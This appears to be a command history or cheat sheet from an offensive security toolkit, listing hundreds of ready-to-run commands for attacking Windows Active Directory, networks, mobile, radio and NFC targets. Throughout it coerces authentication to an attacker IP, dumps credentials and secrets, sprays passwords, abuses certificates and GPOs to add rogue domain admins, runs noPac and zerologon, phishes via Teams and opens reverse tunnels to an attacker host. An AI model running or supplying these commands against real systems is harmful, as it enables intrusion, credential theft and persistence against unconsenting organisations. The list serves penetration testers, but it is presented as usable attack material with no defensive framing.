dnstool.py -u "$DOMAIN"\\"$USER" -p "$PASSWORD" --action query -r "EXEGOL-01.$DOMAIN" "$DC_HOST"
dnstool.py -u "$DOMAIN"\\"$USER" -p "ffffffffffffffffffffffffffffffff":"$NT_HASH" --action query -r "EXEGOL-01.$DOMAIN" "$DC_HOST"
printerbug.py "$DOMAIN"/"$USER":"$PASSWORD"@"$DC_HOST" "$ATTACKER_IP"
evil-winrm -r "$DOMAIN" -i "$TARGET"
evil-winrm -u "$USER" -H "$NT_HASH" -i "$TARGET"
evil-winrm -u "$USER" -p "$PASSWORD" -i "$TARGET"
pypykatz lsa minidump lsass.dmp
pypykatz kerberos tgt "kerberos+rc4://$DOMAIN\\$USER:$NT_HASH@$DOMAIN"
enyx.py 1 public "$TARGET"
enum4linux-ng -A "$TARGET"
enum4linux-ng -A -u "$DOMAIN"/"$USER" -p "$PASSWORD" "$DC_HOST"
zerologon-restore.py "$DOMAIN"/dc01@"$DC_HOST" -target-ip "$TARGET" -hexpass "69762...6945d"
zerologon-scan.py DC01 "$DC_HOST"
oabextract data.oab data.txt
windapsearch --dc "$DC_HOST" --module metadata
windapsearch --dc "$DC_HOST" --module users
oaburl.py "$DOMAIN"/"$USER":"$PASSWORD"@"mx.example.com" -e "existent.email@example.com"
lnk-generate.py --host "$ATTACKER_IP" --type ntlm --output '@SHUTDOWN-LNK.lnk'
polenum -u "$USER" -p "$PASSWORD" -d "$DC_HOST"
smbmap -H "$TARGET"
smbmap -H "$TARGET" -u guest
smbmap -H "$TARGET" -u "$USER" -p "$PASSWORD"
pth-net rpc group addmem 'Domain admins' 'attacker_user' -U "$DOMAIN"/"$USER"%"ffffffffffffffffffffffffffffffff":"$NT_HASH" -S "$DC_HOST"
pth-net rpc group members 'Domain admins' -U "$DOMAIN"/"$USER"%"ffffffffffffffffffffffffffffffff":"$NT_HASH" -S "$DC_HOST"
pth-net rpc password 'targetuser' 'somenewpassword123' -U "$DOMAIN"/"$USER"%"ffffffffffffffffffffffffffffffff":"$NT_HASH" -S "$DC_HOST"
pth-net rpc user add 'newuser' "$PASSWORD" -U "$DOMAIN"/"$USER"%"ffffffffffffffffffffffffffffffff":"$NT_HASH" -S "$DC_HOST"
smtp-user-enum -M EXPN -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t "$TARGET" "$PORT"
smtp-user-enum -M RCPT -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t "$TARGET" "$PORT"
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t "$TARGET" "$PORT"
gpp-decrypt.py -f groups.xml
ntlmv1-multi.py --ntlmv1 SV01$::DOMAIN.LOCAL:AD1235DEAC142CD5FC2D123ADCF51A111ADF45C2345ADCF5:AD1235DEAC142CD5FC2D123ADCF51A111ADF45C2345ADCF5:1122334455667788
hashonymize --ntds $DOMAIN --kerberoast Kerberoastables.txt --asreproast ASREProstables.txt
gosecretsdump -ntds ntds.dit.save -system system.save
proxychains adidnsdump --dns-tcp -u "$DOMAIN"\\"$USER" -p "$PASSWORD" --print-zones "$TARGET"
adidnsdump -u "$DOMAIN"\\"$USER" -p "$PASSWORD" --print-zones "$TARGET"
pygpoabuse.py $DOMAIN/$USER -hashes lm:$NT_HASH -gpo-id "12345677-ABCD-9876-ABCD-123456789012"
bloodhound-import -du neo4j -dp exegol4thewin *.json
bloodhound-quickwin -u neo4j -p exegol4thewin
ldapsearch-ad.py --server "$DC_HOST" --domain "$DOMAIN" --username "$USER" --password "$PASSWORD" --type all
ldapsearch-ad.py --server "$DC_HOST" --type info
petitpotam.py "$ATTACKER_IP" "$DC_HOST"
petitpotam.py -d "$DOMAIN" -u "$USER" -p "$PASSWORD" "$ATTACKER_IP" "$DC_HOST"
dfscoerce.py -d "$DOMAIN" -u "$USER" -p "$PASSWORD" "$ATTACKER_IP" "$DC_HOST"
coercer scan -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --target-ip "$DC_HOST"
coercer coerce --listener "$ATTACKER_IP" --target-ip "$DC_HOST"
coercer coerce -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --listener "$ATTACKER_IP" --target-ip "$DC_HOST"
coercer coerce -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --listener "$ATTACKER_IP" --target-ip "$DC_HOST" --always-continue
gettgtpkinit.py -cert-pfx 'sv01.pfx' -pfx-pass 'RLLXdD5FhNPRphSqKGg8' "$DOMAIN"/'sv01$' 'sv01_TGT.ccache'
gettgtpkinit.py -pfx-base64 'CERT_BASE64' -dc-ip 'DC_IP' "$DOMAIN"/'sv01$' 'sv01_TGT.ccache'
KRB5CCNAME='sv01.ccache' getnthash.py -key '8eb7a6388780dd52eb358769dc53ff685fd135f89c4ef55abb277d7d98995f72' "$DOMAIN"/'sv01$'
pywhisker -v -d "$DOMAIN" -u "$USER" -H "$NT_HASH" -t 'sv01$' -a 'add'
manspider --threads 50 192.168.56.0/24 -d "$DOMAIN" -u "$USER" -H "$NT_HASH" --content administrateur
targetedKerberoast.py -v -d "$DOMAIN" -u "$USER" -p "$PASSWORD" -o Kerberoastables.txt
PCredz -f capture.pcap
pywsus.py --host "$ATTACKER_IP" --port 8530 --executable /opt/resources/windows/SysinternalsSuite/PsExec64.exe --command '/accepteula /s cmd.exe /c "net localgroup Administrators DOMAIN\controlleduser /add"'
DonPAPI "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET"
webclientservicescanner -dc-ip "$DC_HOST" "$DOMAIN"/"$USER":"$PASSWORD"@"$DC_HOST"
certipy find -enabled -u "$USER@$DOMAIN" -p "$PASSWORD" -old-bloodhound
certipy req -username "$USER@$DOMAIN" -p "$PASSWORD" -ca "$CA_NAME" -target "$CA_FQDN" -template "$ESC1_TEMPLATE_NAME" -upn "Administrator@$DOMAIN"
certipy req -username "$USER@$DOMAIN" -hashes "$NT_HASH" -ca "$CA_NAME" -target "$CA_FQDN" -template "$ESC1_TEMPLATE_NAME" -upn "Administrator@$DOMAIN"
certipy relay -ca "$CA_FQDN" -template "$ESC8_TEMPLATE_NAME"
shadowcoerce.py -d "$DOMAIN" -u "$USER" -p "$PASSWORD" "$ATTACKER_IP" "$TARGET"
gMSADumper.py -d "$DOMAIN" -l "$DC_HOST" -u "$USER" -p "$PASSWORD"
pyLAPS.py --action get -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --dc-ip "$DC_IP"
FindUncommonShares.py -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --dc-ip "$DC_IP"
LdapRelayScan.py -method BOTH -dc-ip "$DC_IP" -u "$USER" -p "$PASSWORD"
goldencopy --password 'exegol4thewin' --stealth --krbtgt 060ee2d06c5648e60a9ed916c9221ad19d90e5fb7b1cccf9d51f540fe991ada1 'SRV1$'
goldencopy --tools all --password 'exegol4thewin' --stealth --krbtgt 060ee2d06c5648e60a9ed916c9221ad19d90e5fb7b1cccf9d51f540fe991ada1 'john'
crackhound.py --verbose --password 'exegol4thewin' --plain-text --plain-text --domain "$DOMAIN" --file ownedusers.txt --add-password
kerbrute userenum --domain "$DOMAIN" usernames.txt
kerbrute passwordspray --domain "$DOMAIN" domain_users.txt Password123
kerbrute passwordspray --user-as-pass --domain "$DOMAIN" domain_users.txt
kerbrute bruteuser --domain "$DOMAIN" passwords.lst thoffman
kerbrute bruteforce --domain "$DOMAIN" user_password.lst
ldeep ldap -u "$USER" -p "$PASSWORD" -d "$DOMAIN" -s ldap://"$DC_IP" pso
ldeep ldap -u "$USER" -p "$PASSWORD" -d "$DOMAIN" -s ldap://"$DC_IP" trusts
rusthound -d "$DOMAIN" -u "$USER"@"$DOMAIN" -p "$PASSWORD" -o /workspace/ --zip
rusthound -d "$DOMAIN" -u "$USER"@"$DOMAIN" -p "$PASSWORD" --zip --ldaps --adcs --old-bloodhound
certsync -u $USER -p $PASSWORD -d $DOMAIN -ca-ip $TARGET -outputfile output.txt
KeePwn plugin check -u $USER -p $PASSWORD -d $DOMAIN -t $TARGET
KeePwn plugin add -u $USER -p $PASSWORD -d $DOMAIN -t $TARGET --plugin KeeFarceRebornPlugin.dll
pre2k auth -u $USER -p $PASSWORD -d $DOMAIN --dc-ip $DC_HOST -verbose
msprobe adfs $DOMAIN
msprobe rdp $DOMAIN
msprobe full $DOMAIN
masky -d $DOMAIN -u $USER -dc-ip $DC_HOST -t 5 -o results.txt -ca "srv-01\srv-01-CA"
roastinthemiddle -i eth0 -t $TARGET -u users.txt -g 192.168.187.1
passthecert.py -action add_computer -crt user.crt -key user.key -domain $DOMAIN -dc-ip $DC_HOST
bqm --output-path ~/.config/bloodhound/customqueries.json
bqm --list
neo4j start
noPac.py "$DOMAIN"/"$USER":"$PASSWORD" -dc-ip "$DC_IP" --impersonate "Administrator"
teamsphisher.py -u admin@example.com -p password -l ./targets.txt -a ./salaryinfo.zip -m ./message.txt --log --personalize
gpoddity --gpo-id '46993522-7D77-4B59-9B77-F82082DE9D81' --domain "$DOMAIN" --username 'GPODDITY$' --password "$PASSWORD" --command 'net user attackeradmin exegol4thewin! /add && net localgroup administrators attackeradmin /add' --rogue-smbserver-ip "$ATTACKER_IP" --rogue-smbserver-share "EXEGOL"
gpoddity --gpo-id '7B36419B-B566-46FA-A7B7-58CA9030A604' --gpo-type 'user' --no-smb-server --domain "$DOMAIN" --username 'GPODDITY$' --password "$PASSWORD" --command 'net user attackeradmin exegol4thewin! /add /domain && net group "Domain Admins" attackeradmin /ADD /DOMAIN' --rogue-smbserver-ip "$ATTACKER_IP" --rogue-smbserver-share "EXEGOL"
netexec smb --list-modules
netexec ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" -M maq
netexec ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD"
netexec ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --asreproast ASREProastables.txt --kdcHost "$DC_HOST"
netexec ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --kerberoasting Kerberoastables.txt --kdcHost "$DC_HOST"
netexec smb "$TARGET" --continue-on-success --no-bruteforce -u users.txt -p passwords.txt
netexec smb "$TARGET" --continue-on-success -u users.txt -p passwords.txt
netexec smb "$TARGET" --local-auth -u "$USER" -H "$NT_HASH" -M enum_avproducts
netexec smb "$TARGET" --local-auth -u "$USER" -H "$NT_HASH" -M mimikatz
netexec smb "$TARGET" -u '' -p '' --pass-pol
netexec smb 192.168.56.0/24 --gen-relay-list smb_targets.txt
netexec smb 192.168.56.0/24 --local-auth -u '' -p ''
netexec smb 192.168.56.0/24 -u "$USER" -p "$PASSWORD" --loggedon-users
netexec smb 192.168.56.0/24 -u "$USER" -p "$PASSWORD" --sessions
netexec smb 192.168.56.0/24 -u "$USER" -p "$PASSWORD" --shares
netexec smb 192.168.56.0/24 -u '' -p '' --shares
netexec smb "$IP" -u "$USER" -p "$PASSWORD" -M noPac
netexec smb "$IP" -u "$USER" -p "$PASSWORD" -M petitpotam
netexec smb "$IP" -u '' -p '' -M zerologon
netexec smb "$IP" -u '' -p '' -M ms17-010
netexec smb "$IP" -u '' -p '' -M ioxidresolver
netexec smb --list-modules
nxc ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" -M maq
nxc ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD"
nxc ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --asreproast ASREProastables.txt --kdcHost "$DC_HOST"
nxc ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --kerberoasting Kerberoastables.txt --kdcHost "$DC_HOST"
nxc smb "$TARGET" --continue-on-success --no-bruteforce -u users.txt -p passwords.txt
nxc smb "$TARGET" --continue-on-success -u users.txt -p passwords.txt
nxc smb "$TARGET" --local-auth -u "$USER" -H "$NT_HASH" -M enum_avproducts
nxc smb "$TARGET" --local-auth -u "$USER" -H "$NT_HASH" -M mimikatz
nxc smb "$TARGET" -u '' -p '' --pass-pol
nxc smb 192.168.56.0/24 --gen-relay-list smb_targets.txt
nxc smb 192.168.56.0/24 --local-auth -u '' -p ''
nxc smb 192.168.56.0/24 -u "$USER" -p "$PASSWORD" --loggedon-users
nxc smb 192.168.56.0/24 -u "$USER" -p "$PASSWORD" --sessions
nxc smb 192.168.56.0/24 -u "$USER" -p "$PASSWORD" --shares
nxc smb 192.168.56.0/24 -u '' -p '' --shares
nxc smb "$IP" -u "$USER" -p "$PASSWORD" -M noPac
nxc smb "$IP" -u "$USER" -p "$PASSWORD" -M petitpotam
nxc smb "$IP" -u '' -p '' -M zerologon
nxc smb "$IP" -u '' -p '' -M ms17-010
nxc smb "$IP" -u '' -p '' -M ioxidresolver
ExtractBitlockerKeys.py -dc-ip $DC_IP -Username $USER -Password $PASSWORD -ExportToCSV ./keys.csv -ExportToJSON ./keys.json
LDAPWordlistHarvester.py -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --dc-ip "$DC_IP
KRB5CCNAME="ticket.ccache" pywerview get-netcomputer -k --dc-ip "$DC_IP" --user "$USER"
KRB5CCNAME="ticket.ccache" pywerview get-localdisks -k --computername $COMPUTER --user "$USER"
pywerview get-netuser --workgroup "$DOMAIN" --dc-ip "$DC_IP" --tls --cert cert.crt --key cert.key --username "$USER" --attributes distinguishedname useraccountcontrol 
pywerview get-netgmsa --dc-ip "$DC_IP" --user "$USER" --hashes "$NT_HASH" --resolve-sids
pywerview get-netgmsa --dc-ip "$DC_IP" --tls --user "$USER" --hashes "$NT_HASH" --resolve-sids 
freeipscanner.sh "$INTERFACE"
ntlm_theft.py --verbose --generate modern --server "$ATTACKER_IP" --filename "meetingXYZ"
abuseACL "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET"
abuseACL -hashes "$NT_HASH" -extends "$DOMAIN"/"$USER"
abuseACL -k -principal "$PRINCIPAL" -extends "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET"
abuseACL -principalsfile ./principalsfile "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET"
bloodyAD -d $DOMAIN -u $USER -p $PASSWORD --host $DC_IP set object $COMPUTER_NAME serviceprincipalname
bloodyAD -d $DOMAIN -u $USER -p $PASSWORD --host $DC_IP set object $COMPUTER_NAME dnsHostName -v '$DC_NAME.$DOMAIN'
bloodyAD -d $DOMAIN -u $USER -p $PASSWORD --host $DC_IP get object $COMPUTER_NAME --attr dnsHostName,serviceprincipalname
bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set object vulnerable_user msTSInitialProgram -v '\\1.2.3.4\share\file.exe'
bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set object vulnerable_user msTSWorkDirectory -v 'C:\'
bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set object vulnerable_user scriptPath -v '\\1.2.3.4\share\file.exe'
bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set owner $TargetObject $ControlledPrincipal
bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" get dnsDump
bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" add groupMember $TargetGroup $TargetUser
bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set object 'RODC-server$' --attr msDS-RevealOnDemandGroup -v 'CN=Allowed RODC Password Replication Group,CN=Users,DC=domain,DC=local' -v 'CN=Administrator,CN=Users,DC=domain,DC=local'
bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set object 'RODC-server$' --attr msDS-NeverRevealGroup
bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set password $TargetUser $NewPassword
bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" add genericAll $TargetObject $ControlledPrincipal
bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" add dcsync $ControlledPrincipal
bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" get object $TargetObject --attr msDS-ManagedPassword
autobloody --dbuser "neo4j" --dbpassword "exegol4thewin" --dbsource "$OWNED_USER" --dbtarget "$TARGET_USER" --domain "$DOMAIN" --username "$USER" --password "$PASSWORD" --host "$DC_HOST"
dploot machinecertificates -d "$DOMAIN" -u "$USER" -p "$PASSWORD" "$DC_IP" -quiet
dploot backupkey -d "$DOMAIN" -u "$USER" -p "$PASSWORD" "$DC_IP" -quiet
dploot certificates -d "$DOMAIN" -u "$USER" -p "$PASSWORD" "$DC_IP" -pvk key.pvk  -quiet
dploot browser -d "$DOMAIN" -u "$USER" -p "$PASSWORD" "$DC_IP" -mkfile /data/masterkeys
dploot masterkeys -d "$DOMAIN" -u "$USER" -p "$PASSWORD" "$DC_IP" -pvk key.pvk
dploot masterkeys -d "$DOMAIN" -u "$USER" -p "$PASSWORD" "$DC_IP" -passwords passwords
dploot credentials -d "$DOMAIN" -u "$USER" -p "$PASSWORD" "$DC_IP" -mkfile file.mkf
dploot credentials -d "$DOMAIN" -u "$USER" -p "$PASSWORD" "$DC_IP" -pvk key.pvk
dploot vaults -d "$DOMAIN" -u "$USER" -p "$PASSWORD" "$DC_IP" -mkfile file.mkf
dploot vaults -d "$DOMAIN" -u "$USER" -p "$PASSWORD" "$DC_IP" -pvk key.pvk
dploot rdg -d "$DOMAIN" -u "$USER" -p "$PASSWORD" "$DC_IP" -mkfile file.mkf
dploot rdg -d "$DOMAIN" -u "$USER" -p "$PASSWORD" "$DC_IP" -pvk key.pvk
dploot certificates -d "$DOMAIN" -u "$USER" -p "$PASSWORD" "$DC_IP" -mkfile file.mkf
dploot certificates -d "$DOMAIN" -u "$USER" -p "$PASSWORD" "$DC_IP" -pvk key.pvk
dploot browser -d "$DOMAIN" -u "$USER" -p "$PASSWORD" "$DC_IP" -mkfile file.mkf
dploot browser -d "$DOMAIN" -u "$USER" -p "$PASSWORD" "$DC_IP" -pvk key.pvk
dploot machinemasterkeys -d "$DOMAIN" -u "$USER" -p "$PASSWORD" "$DC_IP"
dploot machinecredentials -d "$DOMAIN" -u "$USER" -p "$PASSWORD" "$DC_IP"
dploot machinevaults -d "$DOMAIN" -u "$USER" -p "$PASSWORD" "$DC_IP"
dploot machinecertificates -d "$DOMAIN" -u "$USER" -p "$PASSWORD" "$DC_IP"
dploot wifi -d "$DOMAIN" -u "$USER" -p "$PASSWORD" "$DC_IP"
dploot sccm -d "$DOMAIN" -u "$USER" -p "$PASSWORD" "$DC_IP"
dploot backupkey -d "$DOMAIN" -u "$USER" -p "$PASSWORD" "$DC_IP"
dploot mobaxterm -d "$DOMAIN" -u "$USER" -p "$PASSWORD" "$DC_IP" -pvk key.pvk
sccmhunter.py admin -u "$USER" -p "$PASSWORD" -ip "$TARGET"
sccmhunter.py find -u "$USER" -p "$PASSWORD" -d "$DOMAIN" -dc-ip "$DC_IP"
sccmhunter.py smb -u "$USER" -p "$PASSWORD" -d "$DOMAIN" -dc-ip "$DC_IP" -save
sccmhunter.py http -u "$USER" -p "$PASSWORD" -d "$DOMAIN" -dc-ip "$DC_IP" -auto
sccmhunter.py http -u "$USER" -p "$PASSWORD" -d "$DOMAIN" -cn "$COMPUTER_NAME" -cp "$COMPUTER_PASSWORD" -dc-ip "$DC_IP"
sccmhunter.py admin -u "$USER" -p ":$NT_HASH" -ip "$TARGET"
sccmhunter.py show -smb
sccmhunter.py show -user
sccmhunter.py show -computers
sccmhunter.py show -all
sccmsecrets.py policies --management-point 'http://MECM_FQDN' --client-name 'CLIENT_NAME'
sccmsecrets.py policies --management-point 'http://MECM_FQDN' --machine-name "$MACHINE_ACCOUNT" --machine-pass "$MACHINE_PASSWORD" --client-name 'CLIENT_NAME'
sccmsecrets.py policies --management-point 'http://MECM_FQDN' --machine-name "$MACHINE_ACCOUNT" --machine-hash "$MACHINE_NTHASH" --client-name 'CLIENT_NAME'
sccmsecrets.py files --distribution-point 'http://MECM_FQDN'
sccmsecrets.py files --distribution-point 'http://MECM_FQDN' --username "$USER" --password "$PASSWORD"
sccmsecrets.py files --distribution-point 'http://MECM_FQDN' --username "$USER" --hash "$USER_NTHASH" --extensions '.bat,.bak,.conf,.ini,.key,.pfx,.ps1,.txt,.xml'
sccmwtf.py fakepc "fakepc.$DOMAIN" "$SCCM_MP_NetBiosName" "$DOMAIN\controlledComputer$" "controlledPassword"
smbclientng -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --host "$DC_IP"
smbng -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --host "$DC_IP"
conpass -d "$DOMAIN" -u "$USER" -p "$PASSWORD" -P /tmp/passwords.txt
AD-miner -c -cf My_Report -u neo4j -p exegol4thewin
adminer -c -cf My_Report -u neo4j -p exegol4thewin
goexec wmi proc "$TARGET" --dc "$DC_IP" --user "$USER" --password "$PASSWORD" --exec 'cmd.exe' --args '/C whoami /all' --output-
goexec dcom mmc "$TARGET" --dc "$DC_IP" --user "$USER" --nt-hash "$NT_HASH" --exec 'cmd.exe' --args '/c whoami /priv' --output result.txt
goexec tsch create "$TARGET" --dc "$DC_IP" --kerberos --user "$USER" --nt-hash "$NT_HASH" --task '\Microsoft\Windows\GoExec' --exec 'C:\Windows\Temp\Beacon.exe'
remotemonologue.py "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET" -query
remotemonologue.py "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET" -dcom {ServerDataCollectorSet,FileSystemImage,UpdateSession} -auth-to "$ATTACKER_HOST" -downgrade
remotemonologue.py "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET" -dcom {ServerDataCollectorSet,FileSystemImage,UpdateSession} -auth-to "$ATTACKER_HOST"@80 -webclient
godap $TARGET --username $USER --password $PASSWORD --domain $DOMAIN
godap $TARGET --username $USER --hashes $NT_HASH --domain $DOMAIN
powerview "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET" --use-ldap
powerview "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET" --use-ldaps
powerview "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET" --use-gc
powerview "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET" --use-gc-ldaps
powerview "$DOMAIN"/"$USER"@"$TARGET" -H "$NT_HASH" 
powerview "$TARGET" --pfx "$USER".pfx
powerview "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET" --web --web-port 3000
pysnaffler 'smb2+ntlm-password://$DOMAIN\$USER:$PASSWORD@$HOST' $HOST
pysnaffler 'smb2+ntlm-nt://$DOMAIN\$USER:$NT_HASH@$HOST' $HOST
pysnaffler 'smb2+kerberos+password://$DOMAIN\$USER:$PASSWORD@$HOST/?dc=$DC_IP' $HOST
adb devices
adb root
adb shell
adb push app.apk
zipalign -p -f -v 4 app.apk outfile.apk
apksigner verify app.apk
apktool d app.apk
scrcpy --tcpip=$TARGET
smali assemble code-smali/ -o code-dex/
d2j-dex2jar.sh -f app.apk
frida-ps -U
frida -l disableRoot.js -f owasp.mstg.uncrackable1
objection --gadget asvid.github.io.fridaapp explore
androguard axml res/xml/network_security_config.xml
androguard arsc resources.arsc
mobsf 0.0.0.0:8000
avrdude -c usbasp -p m328p -U flash:w:avr.hex
minicom -s
nfc-scan-device -v
nfc-list
nfc-mfclassic W A B original.dmp magic-gen1.dmp
mfcuk -C -R 0:A -v 2
mfoc -O original.dmp -k keys.txt
mfoc -O original.dmp
mfoc -O magic-gen1.dmp
libnfc_crypto1_crack a0a1a2a3a4a5 0 A 4 B
mfdread.py original.dmp
proxmark3 -p /dev/ttyACM0
pm3 -p /dev/ttyACM0
sipvicious_svcrack -u100 -d dictionary.txt udp://$TARGET:$PORT
sipvicious_svcrack -u100 -r1-9999 -z4 $TARGET
hackrf_sweep -f 2400:2490
gqrx
rtl-433 -C si
rtl_433 -f 868M -s 1024k
rtl_433 -M hires -M level
rtl_433 -R 1 -R 8 -R 43
nrf24-scanner.py -l -v
jackit --reset --debug
wireshark
tshark -i eth0 -w capture.pcap
tshark -r capture.pcap
tshark -F pcap -r capture.pcapng -w capture.pcap
hping3 $TARGET
masscan -v -p 1-65535 --rate=10000 -e "$INTERFACE" 192.168.56.0/24
masscan -v -p 1-65535,U:1-65535 --rate=10000 -e "$INTERFACE" 192.168.56.0/24
netdiscover -p
netdiscover -i "$INTERFACE" -r 192.168.1.0/24
tcpdump -i eth0 -w capture.pcap
iptables -L
traceroute $TARGET
rdesktop -u $USER -p $PASSWORD -d $DOMAIN
hydra -l $USER -P passwords.txt -s $PORT -f $TARGET http-get /admin
xfreerdp /d:"$DOMAIN" /u:"$USER" /pth:"$NT_HASH" /v:"$TARGET" /cert-ignore /dynamic-resolution
xfreerdp /d:"$DOMAIN" /u:"$USER" /pth:"$NT_HASH" /v:"$TARGET" /cert-ignore /drive:"${SHARENAME},${LOCALPATH}" /dynamic-resolution
xfreerdp /d:"$DOMAIN" /u:"$USER" /p:"$PASSWORD" /v:"$TARGET" /cert-ignore /dynamic-resolution
xfreerdp /d:"$DOMAIN" /u:"$USER" /p:"$PASSWORD" /v:"$TARGET" /cert-ignore /drive:"${SHARENAME},${LOCALPATH}" /dynamic-resolution
mitmproxy
mitmproxy --listen-host "$LHOST" --listen-port "$LPORT"
proxychains -q
proxychains -f config.conf
nmap --script 'smb-enum*' --script-args unsafe=1 -T5 "$TARGET"
nmap --script broadcast-dhcp-discover
nmap --script dns-srv-enum --script-args dns-srv-enum.domain="$DOMAIN"
nmap --script http-ntlm-info --script-args http-ntlm-info.root=/ews/ -p 443 mx.example.com
nmap --script smb-enum-shares -p 139,445 -T4 -Pn "$TARGET"
nmap --script=ldap-search -p 389 "$TARGET"
nmap -Pn -v -sS -F "$TARGET"
nmap -p 5900 --script=realvnc-auth-bypass "$TARGET"
nmap -sC -sV -p 139,445,80,21 "$TARGET"
nmap -sS -n --open -p 88 "$TARGET"
nmap -sS -p 3268,3269 "$TARGET"
nmap -sU --min-rate 5000 -p- $TARGET 
nmap-parse-output /path/to/nmap.xml all-hosts 
nmap-parse-output /path/to/nmap.xml banner $service_name
nmap-parse-output /path/to/nmap.xml blocked-ports 
nmap-parse-output /path/to/nmap.xml group-by-ports 
nmap-parse-output /path/to/nmap.xml group-by-product 
nmap-parse-output /path/to/nmap.xml group-by-service 
nmap-parse-output /path/to/nmap.xml host-ports-protocol 
nmap-parse-output /path/to/nmap.xml host-ports 
nmap-parse-output /path/to/nmap.xml hosts-to-port $port
nmap-parse-output /path/to/nmap.xml hosts 
nmap-parse-output /path/to/nmap.xml http-info 
nmap-parse-output /path/to/nmap.xml http-ports 
nmap-parse-output /path/to/nmap.xml http-title 
nmap-parse-output /path/to/nmap.xml nmap-cmdline 
nmap-parse-output /path/to/nmap.xml port-info $port
nmap-parse-output /path/to/nmap.xml ports-reachable 
nmap-parse-output /path/to/nmap.xml ports 
nmap-parse-output /path/to/nmap.xml product 
nmap-parse-output /path/to/nmap.xml search-product 
nmap-parse-output /path/to/nmap.xml service-names 
nmap-parse-output /path/to/nmap.xml service $service_name
nmap-parse-output /path/to/nmap.xml show-comments 
nmap-parse-output /path/to/nmap.xml ssl-common-name 
nmap-parse-output /path/to/nmap.xml tls-ports 
nmap-parse-output /path/to/nmap.xml comment-hosts $hosts $comment
nmap-parse-output /path/to/nmap.xml comment-ports $ports $comment
nmap-parse-output /path/to/nmap.xml exclude-ports $ports
nmap-parse-output /path/to/nmap.xml exclude $hosts
nmap-parse-output /path/to/nmap.xml include-ports $ports
nmap-parse-output /path/to/nmap.xml include $hosts
nmap-parse-output /path/to/nmap.xml mark-ports $ports $color
nmap-parse-output /path/to/nmap.xml reachable 
nmap-parse-output /path/to/nmap.xml html-bootstrap 
nmap-parse-output /path/to/nmap.xml html 
nmap-parse-output /path/to/nmap.xml to-json
udpx -t $TARGET
udpx -t $TARGET -c 128 -w 1000
autorecon "$TARGET"
dnschef.py --fakeip 127.0.0.1 -q
das add -db dbname masscan '-e "$INTERFACE" --rate 1000 -iL hosts.txt --open -p1-65535'
das add -db dbname rustscan '-b 1000 -t 2000 -u 5000 -a hosts.txt -r 1-65535 -g --no-config --scan-order "Random"'
das scan -db dbname -hosts all -oA report1 -nmap '-Pn -sVC -O' -parallel
das scan -db dbname -ports 22,80,443,445 -show
das report -hosts 192.168.1.0/24 -oA report2
chisel server -p $PORT --socks5 --reverse
chisel client $ATTACKER-IP:$ATTACKER-PORT R:$PORT:socks
sshuttle -r $USER@$TARGET 0.0.0.0/24
eaphammer -i eth0 --channel 4 --auth wpa-eap --essid $ESSID --creds
fierce --domain "$DOMAIN" --dns-servers "$TARGET"
echo 173.0.84.0/24 | dnsx -silent -resp-only -ptr
dnsx -silent -d "$DOMAIN" -w dns_worldlist.txt
dnsx -silent -d domains.txt -w jira,grafana,jenkins
cat domains.txt | dnsx -silent -w jira,grafana,jenkins -d -
shuffledns -d "$DOMAIN" -list example-subdomains.txt -r resolvers.txt
subfinder -d "$DOMAIN" | shuffledns -d "$DOMAIN" -r resolvers.txt
shuffledns -d "$DOMAIN" -w wordlist.txt -r resolvers.txt
echo "$DOMAIN" | shuffledns -w wordlist.txt -r resolvers.txt
tailscale up --advertise-routes=10.10.11.0/24
tailscaled --tun=userspace-networking --socks5-server=localhost:1055 &>/dev/null &
ligolo-ng -selfcert
ip tuntap add user root mode tun ligolo
ip link set ligolo up
